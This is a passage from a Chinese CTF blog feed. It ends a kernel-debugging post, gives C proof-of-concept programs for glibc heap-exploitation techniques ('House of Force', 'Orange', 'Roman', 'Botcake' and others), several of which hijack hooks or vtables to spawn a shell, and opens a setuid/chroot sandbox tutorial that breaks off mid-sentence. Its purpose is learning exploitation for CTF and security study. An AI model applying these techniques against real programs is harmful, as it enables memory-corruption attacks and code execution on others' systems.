0 - Live 0xffffffffc0211000 (O)</code></pre><p>或者可以修改启动脚本以 root 权限来查看 <code>/sys/module/core/sections/.text</code> 段的值：</p><pre><code class="bash">/ # cat /sys/module/core/sections/.text0xffffffffc0211000</code></pre></blockquote><p>然后就可以 <code>target remote localhost:1234</code> 开始调试了：</p><pre><code class="bash">$ gdb ./vmlinux -qGEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5Reading symbols from ./vmlinux...(no debugging symbols found)...done.gef➤  add-symbol-file fs/core.ko 0xffffffffc027a000add symbol table from file &quot;fs/core.ko&quot; at    .text_addr = 0xffffffffc027a000Reading symbols from fs/core.ko...(no debugging symbols found)...done.gef➤  b core_readBreakpoint 1 at 0xffffffffc027a063gef➤  target remote localhost:1234Remote debugging using localhost:12340xffffffffa6a6e7d2 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax   : 0xffffffffa6a6e7d0  →  0x2e66001f0fc3f4fb  →  0x2e66001f0fc3f4fb$rbx   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$rcx   : 0x0000000000000000  →  0x0000000000000000$rdx   : 0x0000000000000000  →  0x0000000000000000$rsp   : 0xffffffffa7403eb8  →   movabs al, ds:0xc2ffffffffa62b65$rbp   : 0x0000000000000000  →  0x0000000000000000$rsi   : 0x0000000000000000  →  0x0000000000000000$rdi   : 0x0000000000000000  →  0x0000000000000000$rip   : 0xffffffffa6a6e7d2  →  0x1f0f2e66001f0fc3  →  0x1f0f2e66001f0fc3$r8    : 0xffff8d484641bf20  →   (bad)$r9    : 0x0000000000000000  →  0x0000000000000000$r10   : 0x0000000000000000  →  0x0000000000000000$r11   : 0x000000000000018c  →  0x000000000000018c$r12   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r13   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r14   : 0x0000000000000000  →  0x0000000000000000$r15   : 0x0000000000000000  →  0x0000000000000000$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ────   0xffffffffa6a6e7cf                  nop   0xffffffffa6a6e7d0                  sti   0xffffffffa6a6e7d1                  hlt   0xffffffffa6a6e7d2                  ret   0xffffffffa6a6e7d3                  nop    DWORD PTR [rax]   0xffffffffa6a6e7d6                  nop    WORD PTR cs:[rax+rax*1+0x0]   0xffffffffa6a6e7e0                  mov    rax, QWORD PTR gs:0x14d40   0xffffffffa6a6e7e9                  or     BYTE PTR ds:[rax+0x2], 0x20   0xffffffffa6a6e7ee                  mov    rdx, QWORD PTR [rax]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, stopped 0xffffffffa6a6e7d2 in ?? (), reason: SIGTRAP───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffffa6a6e7d2 → ret[#1] 0xffffffffa62b65a0 → jmp 0xffffffffa62b6541[#2] 0xc2 → irq_stack_union()[#3] 0xffffffffa78c4900 → int3[#4] 0xffff8d48466d4900 → jb 0xffff8d48466d4971[#5] 0xffffffffa78cc2c0 → int3────────────────────────────────────────────────────────────────────────────────gef➤</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a><br><a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">http://m4x.fun/post/linux-kernel-pwn-abc-1/</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html</a><br><a href="https://blog.csdn.net/jhyboss/article/details/76505873" target="_blank" rel="noopener">https://blog.csdn.net/jhyboss/article/details/76505873</a><br><a href="https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html</a><br><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a><br><a href="https://blog.csdn.net/m0_38100569/article/details/100673103" target="_blank" rel="noopener">https://blog.csdn.net/m0_38100569/article/details/100673103</a><br><a href="http://eternalsakura13.com/2018/03/31/b_core/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/03/31/b_core/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初涉 Kernel Exploit。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>House of All in One</title>
    <link href="blog.b3ale.cn/2020/04/25/%5BTODO%5DHouse-of-All-in-One/"/>
    <id>blog.b3ale.cn/2020/04/25/%5BTODO%5DHouse-of-All-in-One/</id>
    <published>2020-04-25T15:39:50.000Z</published>
    <updated>2020-05-03T13:50:44.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>House-of-*</code> 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做<a href="https://en.wikipedia.org/wiki/Malleus_Maleficarum" target="_blank" rel="noopener">女巫之槌</a>）的文章。</p><a id="more"></a><h1 id="Malleus-Maleficarum"><a href="#Malleus-Maleficarum" class="headerlink" title="Malleus Maleficarum"></a><a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="noopener">Malleus Maleficarum</a></h1><h2 id="House-of-Prime-glibc-2-3-5"><a href="#House-of-Prime-glibc-2-3-5" class="headerlink" title="House of Prime (glibc-2.3.5)"></a>House of Prime (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2014/08/24/x86-exploitation-101-this-is-the-first-witchy-house/" target="_blank" rel="noopener">X86 EXPLOITATION 101: THIS IS THE FIRST WITCHY HOUSE</a>)</p><pre><code class="cpp">void_int_free(mstate av, Void_t* mem){    mchunkptr       p;           /* chunk corresponding to mem */    INTERNAL_SIZE_T size;        /* its size */    mfastbinptr*    fb;          /* associated fastbin */    ...    p = mem2chunk(mem);    size = chunksize(p);    if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)        || __builtin_expect ((uintptr_t) p &amp; MALLOC_ALIGN_MASK, 0))    {        errstr = &quot;free(): invalid pointer&quot;;      errout:        malloc_printerr (check_action, errstr, mem);        return;    }</code></pre><h2 id="House-of-Mind-glibc-2-3-5"><a href="#House-of-Mind-glibc-2-3-5" class="headerlink" title="House of Mind (glibc-2.3.5)"></a>House of Mind (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF MIND” – UNDEAD AND LOVING IT…</a>)</p><pre><code class="cpp">public_fREe(Void_t* mem){  mstate ar_ptr;  mchunkptr p;                          /* chunk corresponding to mem */  void (*hook) (__malloc_ptr_t, __const __malloc_ptr_t) = __free_hook;  if (hook != NULL) {    (*hook)(mem, RETURN_ADDRESS (0));    return;  }  if (mem == 0)                              /* free(0) has no effect */    return;  p = mem2chunk(mem);#if HAVE_MMAP  if (chunk_is_mmapped(p))                       /* release mmapped memory. */  {    munmap_chunk(p);    return;  }#endif  ar_ptr = arena_for_chunk(p);#if THREAD_STATS  if(!mutex_trylock(&amp;ar_ptr-&gt;mutex))    ++(ar_ptr-&gt;stat_lock_direct);  else {    (void)mutex_lock(&amp;ar_ptr-&gt;mutex);    ++(ar_ptr-&gt;stat_lock_wait);  }#else  (void)mutex_lock(&amp;ar_ptr-&gt;mutex);#endif  _int_free(ar_ptr, mem);  (void)mutex_unlock(&amp;ar_ptr-&gt;mutex);}</code></pre><h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>Modify top chunk to control buffer.</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF FORCE” – JEDI OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define offset1 0x601080 - 0x10 - 0x602020 - 0x10#define offset2 0x7fffffffdf10 - 0x10 - 0x6014f0 - 0x10char buf1[50] = &quot;Original Buffer (bss).&quot;;int main() {    void *p, *q;    char buf2[50] = &quot;Original Buffer (stack).&quot;;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset1);    q = malloc(0x48);    puts(buf1);    memset(q, &#39;X&#39;, strlen(buf1));    puts(buf1);    /*    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset2);    q = malloc(0x48);    puts(buf2);    memset(q, &#39;Y&#39;, strlen(buf2));    puts(buf2);    */    exit(0);}</code></pre><h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>Use the mechanism of smallbin to control buffer. (maybe Smallbin Attack)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void sh() {    system(&quot;/bin/sh&quot;);    exit(0);}int main() {    void *p, *q, *r, *s, *t;    char buf1[0x20], buf2[0x20];    fprintf(stderr, &quot;buf1 =&gt; %p\n&quot;, buf1);    fprintf(stderr, &quot;buf2 =&gt; %p\n&quot;, buf2);    p = malloc(0x68);    fprintf(stderr, &quot;p = malloc(0x68) =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)buf1 + 0x10) = (uint64_t)p - 0x10; // Set buf1&#39;s fd = p - 0x10    *(uint64_t *)((uint64_t)buf1 + 0x18) = (uint64_t)buf2; // Set buf1&#39;s bk = buf2    *(uint64_t *)((uint64_t)buf2 + 0x10) = (uint64_t)buf1; // Set buf2&#39;s fd = buf1    q = malloc(0x408);    fprintf(stderr, &quot;q = malloc(0x408) =&gt; %p\n&quot;, q);    free(p);    r = malloc(0x508);    fprintf(stderr, &quot;r = malloc(0x508) =&gt; %p\n&quot;, r); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)p + 0x8) = (uint64_t)buf1; // Set p&#39;s bk = buf1    s = malloc(0x68);    fprintf(stderr, &quot;s = malloc(0x68) =&gt; %p\n&quot;, s); // Get p (The original Freed Chunk)    t = malloc(0x68);    fprintf(stderr, &quot;t = malloc(0x68) =&gt; %p\n&quot;, t); // Allacte to Stack    uint64_t sh_addr = (uint64_t)sh;    memcpy(t + 0x48, &amp;sh_addr, 8);}</code></pre><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>Free a fake chunk into fastbin. (Stack overflow)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;char target[0x100];int main() {    void *p, *mem;    fprintf(stderr, &quot;Target =&gt; %p\n&quot;, target);    p = malloc(0x58);    mem = (uint64_t *)((uint64_t)target + 0x10); // Get fake chunk&#39;s mem    fprintf(stderr, &quot;fake chunk&#39;s mem =&gt; %p\n&quot;, mem);    *(uint64_t *)((uint64_t)target + 0x8) = 0x61; // Set fake chunk&#39;s size = 0x61    *(uint64_t *)((uint64_t)target + 0x68) = 0x41; // Set fake chunk&#39;s next chunk&#39;s size = 0x41    free(p);    free(mem);    fprintf(stderr, &quot;malloc(0x58) =&gt; %p\n&quot;, malloc(0x58));    exit(0);}</code></pre><h2 id="House-of-Chaos"><a href="#House-of-Chaos" class="headerlink" title="House of Chaos"></a>House of Chaos</h2><pre><code>(&amp;*^^&amp;%$#%$#**_)+_(_)**(%%^##$@%^^*(%$&amp;*%^$&amp;%%^^&amp;#!@^&amp;_)^&amp;...</code></pre><h1 id="Later-House"><a href="#Later-House" class="headerlink" title="Later House"></a>Later House</h1><h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a><a href="https://www.youtube.com/watch?v=tq3mPjsl-H0" target="_blank" rel="noopener">House of Einherjar</a></h2><p>Mostly chunk overlapping. (Unlink, Off by One)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;int main() {    char *p, *q, *r, *s;    p = malloc(0x208);    q = malloc(0x18);    r = malloc(0xf8);    s = malloc(0x18);    printf(&quot;Fake chunk =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)p) = 0;    *(uint64_t *)((uint64_t)p + 0x8) = 0x221; // Fake chunk&#39;s size    // Bypass unlink    *(uint64_t *)((uint64_t)p + 0x10) = p; // Fake chunk&#39;s fd    *(uint64_t *)((uint64_t)p + 0x18) = p; // Fake chunk&#39;s bk    printf(&quot;Off by One\n&quot;);    *(uint64_t *)((uint64_t)q + 0x10) = 0x220; // prev_size    *(uint8_t *)((uint64_t)q + 0x18) = &#39;\x00&#39;; // Off by One    free(r); // unlink    printf(&quot;malloc(0x310) =&gt; %p\n&quot;, malloc(0x318));    return 0;}</code></pre><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">House of Orange</a></h2><p>Create a freed chunk without <code>free()</code> and attack with <code>_IO_FILE</code> structure. (Unsortedbin Attack)</p><pre><code class="cpp">// glibc-2.23 version#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define _IO_list_all 0x3c5520#define one_gadget 0xf1147char fake_vtable[0xa8];int main() {    void *p;    void *fake_file;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = 0xfe1; // Set top chunk&#39;s size = 0xfe1    malloc(0x1000); // Trigger sysmalloc (free top chunk)    p = malloc(0x500); // Get a unsortedbin-chunk    uint64_t libc_base = (uint64_t)(*(uint64_t *)p) - 0x3c5188;    fprintf(stderr, &quot;leak libc =&gt; %p\n&quot;, libc_base);    uint64_t unsorted_bin_chunk_addr = (uint64_t)p + 0x500;    fake_file = unsorted_bin_chunk_addr;    uint64_t IO_list_all_addr = libc_base + _IO_list_all;    // Create fake file (also a fake smallbin)    *(uint64_t *)((uint64_t)fake_file + 0x8) = 0x61; // _IO_read_ptr ; Set smallbin&#39;s size ; Fake _chain @ `&amp;unsortedbin + 0x68`    *(uint64_t *)((uint64_t)fake_file + 0x18) = IO_list_all_addr - 0x10; // _IO_read_base ; For Unsoredbin Attack    // Bypass _IO_overflow_t    *(uint64_t *)((uint64_t)fake_file + 0xc0) = 0; // _mode    *(uint64_t *)((uint64_t)fake_file + 0x28) = 1; // _IO_write_ptr    *(uint64_t *)((uint64_t)fake_file + 0x20) = 0; // _IO_write_base    *(uint64_t *)((uint64_t)fake_file + 0xd8) = fake_vtable; // vtable    uint64_t one_gadget_addr = libc_base + one_gadget;    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget_addr; // __overflow    malloc(1); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a><a href="https://github.com/shift-crops/House_of_Rabbit" target="_blank" rel="noopener">House of Rabbit</a></h2><p>TODO</p><p>(recommend <a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">P4nda’s article</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char target[0x50] = &quot;Orignial Buffer.&quot;;char buf[0x40];int main() {    void *p, *q;    fprintf(stderr, &quot;Target: %s\n&quot;, target);    p = malloc(0xa00008);    free(p);    p = malloc(0xa00008);    free(p);    p = malloc(0x28);    q = malloc(0x88);    free(p);    *(uint64_t *)((uint64_t)buf + 0x8) = 0x11; // Set Fake Chunk1&#39;s size = 0x11    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk2&#39;s prev_size = 0xfffffffffffffff1    *(uint64_t *)((uint64_t)p) = (uint64_t *)((uint64_t)buf + 0x10); // Set Fastbin Chunk&#39;s fd = Fake Chunk2    free(q); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)buf + 0x18) = 0xa00001; // Set Fake Chunk    malloc(0xa00000);    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk    int offset = (uint64_t)&amp;target - ((uint64_t)buf + 0x10) - 0x20;    p = malloc(offset);    fprintf(stderr, &quot;p = malloc(offset) =&gt; %p\n&quot;, p);    void *victim = malloc(0x18);    strcpy(victim, &quot;Hacked.&quot;);    fprintf(stderr, &quot;Target: %s\n&quot;, target);    exit(0);}</code></pre><h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">House of Roman</a></h2><p>Partial write to control PC. (Off by One, Fastbin Attack, Unsortedbin Attack, etc)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a0d000#define __malloc_hook libc_base+0x3c4b10#define one_gadget libc_base+0xf02a4int main() {    void *p, *q, *r, *s, *u, *v;    p = malloc(0x18);    q = malloc(0xc8);    r = malloc(0x68);    *(uint64_t *)((uint64_t)q + 0x68) = 0x61;    free(q);    q = malloc(0xc8); // Get Unsortedbin addr    s = malloc(0x68);    u = malloc(0x68); // For fixing Fastbin    v = malloc(0x68); // For triggering malloc_printerr    *(uint8_t *)((uint64_t)p + 0x18) = 0x71; // Off by One    free(r);    free(s);    *(uint8_t *)((uint64_t)s) = 0x20; // Point s&#39;s fd to q    *(uint16_t *)((uint64_t)q) = (__malloc_hook - 0x23) &amp; 0xffff; // Point q&#39;s fd to `&amp;__malloc_hook - 0x23`    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    p = malloc(0x68); // Get the chunk @ `&amp;__malloc_hook - 0x23`    free(u);    *(uint64_t *)((uint64_t)u) = 0; // Set Fastbin&#39;s fd = 0 to fix Fastbin    q = malloc(0xc8);    fprintf(stderr, &quot;malloc(0x18) =&gt; %p\n&quot;, malloc(0x18));    free(q);    // Unsortedbin Attack    *(uint16_t *)((uint64_t)q + 0x8) = (__malloc_hook - 0x10) &amp; 0xffff; // Point q&#39;s bk to `&amp;__malloc_hook - 0x10`    fprintf(stderr, &quot;malloc(0xc8) =&gt; %p\n&quot;, malloc(0xc8));    // Partial Write one_gadget    *(uint16_t *)((uint64_t)p + 0x13) = one_gadget &amp; 0xffff;    *(uint8_t *)((uint64_t)p+ 0x15) = (one_gadget &gt;&gt; 16) &amp; 0xff;    free(v);    free(v); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Botcake-gt-glibc-2-26"><a href="#House-of-Botcake-gt-glibc-2-26" class="headerlink" title="House of Botcake (&gt;= glibc-2.26)"></a><a href="https://raw.githubusercontent.com/shellphish/how2heap/master/glibc_2.26/house_of_botcake.c" target="_blank" rel="noopener">House of Botcake</a> (&gt;= glibc-2.26)</h2><p>Bypass double free restriction on tcache. (Double Free, Chunk Overlapping)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void *ptr[7];char buf[0x20];int main() {    void *p;    fprintf(stderr, &quot;target =&gt; %p\n&quot;, buf);    for (int i = 0; i &lt; 7; i++) { // Fillup Tcache        ptr[i] = malloc(0x108);    }    p = malloc(0x108);    void *victim = malloc(0x108);    malloc(0x18); // padding    for (int i = 0; i &lt; 7; i++) {        free(ptr[i]);    }    free(victim); // Add to unsortedbin    free(p); // Consolidate with victim    malloc(0x108); // get a chunk from Tcache &amp; put victim into Tcache    free(victim); // Double free    p = malloc(0x128);    *(uint64_t *)((uint64_t)p + 0x110) = buf; // Overwrite victim&#39;s fd = buf    malloc(0x108);    p = malloc(0x108);    fprintf(stderr, &quot;p = malloc(0x108) =&gt; %p\n&quot;, p);    exit(0);}</code></pre><h2 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a><a href="https://github.com/CptGibbon/House-of-Corrosion" target="_blank" rel="noopener">House of Corrosion</a></h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=dooN6X28daI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=dooN6X28daI</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a><br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a><br><a href="https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/" target="_blank" rel="noopener">https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;House-of-*&lt;/code&gt; 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做&lt;a href=&quot;https://en.wikipedia.org/wiki/Malleus_Maleficarum&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;女巫之槌&lt;/a&gt;）的文章。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Setuid</title>
    <link href="blog.b3ale.cn/2020/04/23/Linux-Sandbox-Setuid/"/>
    <id>blog.b3ale.cn/2020/04/23/Linux-Sandbox-Setuid/</id>
    <published>2020-04-23T14:39:04.000Z</published>
    <updated>2020-04-24T11:47:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>Yet Another Linux Sandbox Technic.</p><a id="more"></a><h1 id="Combination-Blow"><a href="#Combination-Blow" class="headerlink" title="Combination Blow"></a>Combination Blow</h1><p>Setuid Sandbox 主要是基于 Linux Kernel 所提供的安全机制（如 DAC）来实现。简单地说就是利用 <code>random uid/gid + chroot() + capability</code> 的组合出击来达到目标。其实现非常简单，无需修改 Kernel。Setuid Sandbox 的实现简单易行。在一定程度上，它可以用于隔离不可信的程序。由于它完全依赖于 kernel 所提供的安全机制，除非攻击者能找到 kernel 的 0-day 漏洞并通过攻击获得 root 权限，否则 Setuid Sandbox 所提供的安全隔离是可以保证的。</p><h2 id="What-is-setuid"><a href="#What-is-setuid" class="headerlink" title="What is setuid"></a>What is setuid</h2><p>Linux 中每个进程都会有一个 uid，<code>uid = 0</code> 则为 root 用户进程（privileged），<code>uid &gt; 0</code>则为普通用户进程（unprivileged）。不同 uid 进程之间（不包括 root 进程）是相互隔离的，各自都有自己独立的权限，互不干扰。而 root 进程具有特权，它能干任何事情。Linux uid/gid 机制主要是用于进程的权限隔离。如果你打算执行不可信的程序，那么你可以在启动该程序时为其分配一个 random uid，大概的执行流程如下：<code>fork() -&gt; setuid() -&gt; {设置相关的进程资源限制，如 RLIMIT_NPROC (0,0)} -&gt; execve()</code>。而 <code>setuid()</code> 只能由 root 权限（或拥有 <code>CAP_SETUID</code> Capability）才能成功调用，所以要顺利执行这个流程需要借助某个拥有 root 权限的进程。</p><p>Linux 下为进程设置了三个 UID：</p><ul><li>Real UID（RUID）：进程创建者的 UID，正常情况下它一直不会变化，永远表示进程创建者，但 root 用户可以更改它；</li><li>Saved UID（SUID）：拥有者可以为自己的可执行程序设置 SUID 位，设置后任何人执行程序，程序启动时都将获得程序拥有者的权限；</li><li>Effective UID（EUID）：为权限检查时实际生效的 UID，意味着在判断用户权限时并不检查 RUID 及 SUID，只看 EUID。</li></ul><p>用 <code>getresuid</code> 来获取当前用户的三个 UID：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    if (getresuid(&amp;ruid, &amp;euid, &amp;suid) == 0) {        printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    } else {        ;    }    return 0;}</code></pre><p>如果为文件加上 SUID 标志位，其他用户运行该文件时会获得 root 的权限。但 RUID 保持不变：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ sudo -u root ./test-uidRUID: 0    EUID: 0    SUID: 0root in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 33    SUID: 33root in ~/Setuid-Sandbox λ chmod u+s ./test-uidroot in ~/Setuid-Sandbox λ ls -l ./test-uid-rwsr-xr-x 1 root root 8720 Apr 24 19:11 ./test-uidroot in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 0    SUID: 0</code></pre><h2 id="What-is-chroot"><a href="#What-is-chroot" class="headerlink" title="What is chroot"></a>What is chroot</h2><p>通常来说，提到 Chroot 一般有两个含义，<code>chroot(1)</code> 是 <code>/usr/bin/chroot</code>，<code>chroot(2)</code> 是 glibc 中的一个函数。Chroot 是 Linux Kernel 提供的另一个安全功能，它用于改变进程的根目录。比如运行 <code>chroot(&quot;/tmp/sandbox/1/&quot;)</code>，会启动一个新的 Shell 并设置新进程的根目录为 <code>&quot;/tmp/sandbox/1/&quot;</code>，那么该进程的文件操作将被限制在 <code>&quot;/tmp/sandbox/1/&quot;</code> 中。注意，<code>chroot()</code> 只能由 root 权限（或拥有 <code>CAP_SYS_CHROOT</code> Capability）才能成功调用。</p><h3 id="Chroot-Command"><a href="#Chroot-Command" class="headerlink" title="Chroot Command"></a>Chroot Command</h3><p>需要静态编译 Busybox 和 Bash：</p><pre><code class="bash">$ wget$ tar -zxvf$ cd  &amp;&amp; mkdir build$ make O=build defconfig$ cd build &amp;&amp; make menuconfig # Select &quot;Build BusyBox as a static binary (no shared libs)&quot;$ make$ wget http://ftp.gnu.org/gnu/bash/bash-5.0-beta.tar.gz$ tar -zxvf bash-5.0-beta.tar.gz$ cd bash-5.0-beta &amp;&amp; ./configure --enable-static-link --without-bash-malloc$ make</code></pre><p>使用 chroot 来修改当前的根目录，可以看到 ls 的结果是不同的：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ ./bashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# ./busybox ls /bin             etc             initrd.img.old  lost+found      opt             run             sys             varboot            home            lib             media           proc            sbin            tmp             vmlinuzdev             initrd.img      lib64           mnt             root            srv             usr             vmlinuz.oldroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# exitexitroot in ~/Setuid-Sandbox λ chroot . ./bashbash-5.0# ./busybox ls /bash      busybox   chroot    chroot.c  lsbash-5.0# exitexit</code></pre><h3 id="Chroot-Function"><a href="#Chroot-Function" class="headerlink" title="Chroot Function"></a>Chroot Function</h3><p>进程中有 <code>cwd</code>（当前目录）和 <code>root</code>（根目录）两个目录。C 库中提供了几个函数对两者进行修改：</p><pre><code class="cpp">int chdir(const char *path);     //依据目录名改cwdint fchdir(int fd);              //依据文件描述符改cwdint chroot(const char *path);    //依据目录名改root</code></pre><pre><code class="cpp">#include &lt;unistd.h&gt;int main() {    chroot(&quot;.&quot;);    chdir(&quot;/&quot;);    char *argv[] = {&quot;./bash&quot;, NULL};    execl(argv[0], argv, NULL);    return 0;}</code></pre><h3 id="Create-bash-jail"><a href="#Create-bash-jail" class="headerlink" title="Create bash jail"></a>Create bash jail</h3><p>可以使用 <a href="https://olivier.sessink.nl/jailkit/index.html" target="_blank" rel="noopener">jailkit</a> 创建一个安全的 jail 环境：</p><pre><code class="bash">$ wget https://olivier.sessink.nl/jailkit/jailkit-2.20.tar.gz$ tar -zxvf jailkit-2.20.tar.gz$ cd jailkit-2.20 &amp;&amp; ./configure$ make$ make install</code></pre><h3 id="Combine-with-setuid"><a href="#Combine-with-setuid" class="headerlink" title="Combine with setuid"></a>Combine with setuid</h3><p>那么在前面叙述的执行流程中，可以先让具有 root 权限的进程去执行 <code>chroot()</code> 后再调用 <code>setuid() -&gt; {...} -&gt; 